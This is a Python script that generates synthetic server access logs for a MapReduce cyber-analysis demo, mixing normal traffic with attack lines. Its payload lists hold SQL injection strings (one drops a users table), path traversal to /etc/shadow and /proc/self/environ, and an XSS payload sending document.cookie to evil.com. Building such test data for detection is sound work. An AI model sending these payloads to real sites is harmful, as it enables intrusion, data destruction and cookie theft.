#!/usr/bin/env python3
"""
Generates realistic server access logs with embedded attack patterns
for the MapReduce cyber analysis demo.

Usage:
    python3 generate_logs.py [output_dir] [num_files] [lines_per_file]
"""

import random
import sys
import os
from datetime import datetime, timedelta

# Threat actor IP pools (simulate botnet clusters)
BOTNET_IPS = [f"185.220.{random.randint(100,200)}.{random.randint(1,254)}" for _ in range(50)]
SCANNER_IPS = [f"45.33.{random.randint(1,254)}.{random.randint(1,254)}" for _ in range(20)]
LEGIT_IPS = [f"103.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}" for _ in range(200)]
ALL_IPS = BOTNET_IPS + SCANNER_IPS + LEGIT_IPS

# Attack payloads
SQL_ATTACKS = [
    "/login?user=' OR '1'='1",
    "/search?q=UNION+SELECT+username,password+FROM+users--",
    "/api/user?id=1+AND+SLEEP(5)",
    "/product?id=1;DROP+TABLE+users--",
    "/admin?id=1+UNION+SELECT+1,2,3--",
    "/api/data?filter='+OR+1=1--",
    "/login?pass=1'+OR+'1'='1",
    "/users?id=1+AND+1=1+BENCHMARK(5000000,MD5(1))",
    "/api?q=1+AND+(SELECT+1+FROM(SELECT+COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x+FROM+information_schema.tables+GROUP+BY+x)a)",
]

XSS_ATTACKS = [
    "/search?q=<script>alert(document.cookie)</script>",
    "/comment?text=<img+src=x+onerror=alert(1)>",
    "/profile?name=<svg+onload=fetch('http://evil.com/steal?c='+document.cookie)>",
    "/api?callback=javascript:alert(1)",
    "/page?redirect=javascript:void(document.location='http://phish.evil/')",
]

PATH_TRAVERSAL = [
    "/../../../etc/passwd",
    "/..%2F..%2F..%2Fetc%2Fshadow",
    "/api/../../../windows/win.ini",
    "/static/../../../../etc/hosts",
    "/download?file=../config.php",
    "/images/../../../proc/self/environ",
]

SCAN_PATHS = [
    "/.env",
    "/.git/config",
    "/wp-admin/",
    "/phpMyAdmin/",
    "/admin.php",
    "/.DS_Store",
    "/backup.zip",
    "/config.bak",
    "/.htpasswd",
    "/actuator/health",
    "/api/swagger-ui.html",
    "/server-status",
    "/Makefile",
    "/config/database.yml",
    "/.well-known/security.txt",
]

LEGIT_PATHS = [
    "/", "/index.html", "/about", "/products", "/api/v1/users",
    "/api/v1/orders", "/dashboard", "/login", "/signup", "/profile",
    "/assets/main.css", "/assets/app.js", "/favicon.ico",
    "/api/v1/health", "/api/v1/items?page=1", "/api/v1/items?page=2",
]

SUSPICIOUS_UAS = [
    "sqlmap/1.7 (https://sqlmap.org)",
    "Nikto/2.1.6",
    "masscan/1.3",
    "python-requests/2.31.0",
    "curl/7.68.0",
    "Go-http-client/1.1",
    "zgrab/0.x",
    "Mozilla/5.0 zgrab/0.x",
    "dirbuster-ng",
    "Havij",
]

LEGIT_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
    "PostmanRuntime/7.37.0",
]

METHODS = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD"]
STATUS_CODES = [200, 200, 200, 200, 200, 301, 302, 400, 401, 403, 404, 404, 404, 422, 500, 503]

def random_timestamp(base_date):
    offset = timedelta(
        hours=random.randint(0, 23),
        minutes=random.randint(0, 59),
        seconds=random.randint(0, 59)
    )
    dt = base_date + offset
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0700")

def generate_attack_line(base_date):
    """Generate a log line with an embedded attack"""
    attack_type = random.choice(["sql", "xss", "traversal", "scan"])
    ip = random.choice(BOTNET_IPS + SCANNER_IPS)
    ts = random_timestamp(base_date)
    ua = random.choice(SUSPICIOUS_UAS)
    method = "GET"
    
    if attack_type == "sql":
        path = random.choice(SQL_ATTACKS)
        status = random.choice([200, 401, 403, 500])
    elif attack_type == "xss":
        path = random.choice(XSS_ATTACKS)
        status = random.choice([200, 400])
    elif attack_type == "traversal":
        path = random.choice(PATH_TRAVERSAL)
        status = random.choice([200, 403, 404])
    else:
        path = random.choice(SCAN_PATHS)
        status = random.choice([200, 403, 404, 404, 404])
    
    size = random.randint(100, 10000)
    return f'{ip} - - [{ts}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'

def generate_legit_line(base_date):
    """Generate a legitimate traffic log line"""
    ip = random.choice(LEGIT_IPS)
    ts = random_timestamp(base_date)
    ua = random.choice(LEGIT_UAS)
    method = random.choice(METHODS)
    path = random.choice(LEGIT_PATHS)
    status = random.choice(STATUS_CODES)
    size = random.randint(200, 50000)
    return f'{ip} - - [{ts}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'

def generate_log_file(filepath, num_lines, base_date):
    """Generate a single log file"""
    # ~30% attack traffic to make it interesting
    attack_ratio = 0.30
    
    with open(filepath, 'w') as f:
        for _ in range(num_lines):
            if random.random() < attack_ratio:
                line = generate_attack_line(base_date)
            else:
                line = generate_legit_line(base_date)
            f.write(line + "\n")
    
    print(f"  ✅ Generated {filepath} ({num_lines} lines)")

def main():
    output_dir = sys.argv[1] if len(sys.argv) > 1 else "/data"
    num_files = int(sys.argv[2]) if len(sys.argv) > 2 else 6
    lines_per_file = int(sys.argv[3]) if len(sys.argv) > 3 else 5000
    
    os.makedirs(output_dir, exist_ok=True)
    
    print(f"\n🔐 Cyber Attack Log Generator")
    print(f"   Output dir  : {output_dir}")
    print(f"   Log files   : {num_files}")
    print(f"   Lines/file  : {lines_per_file:,}")
    print(f"   Total lines : {num_files * lines_per_file:,}\n")
    
    servers = [
        "web-server-jakarta",
        "web-server-singapore", 
        "api-gateway-primary",
        "api-gateway-secondary",
        "cdn-edge-node-1",
        "cdn-edge-node-2",
        "db-proxy-east",
        "auth-service",
    ]
    
    base_date = datetime(2026, 5, 13)
    
    for i in range(num_files):
        server_name = servers[i % len(servers)]
        filepath = os.path.join(output_dir, f"{server_name}.log")
        generate_log_file(filepath, lines_per_file, base_date)
    
    total = num_files * lines_per_file
    print(f"\n✨ Done! Generated {total:,} log entries across {num_files} files")
    print(f"   ~{int(total * 0.30):,} attack attempts embedded")

if __name__ == "__main__":
    main()
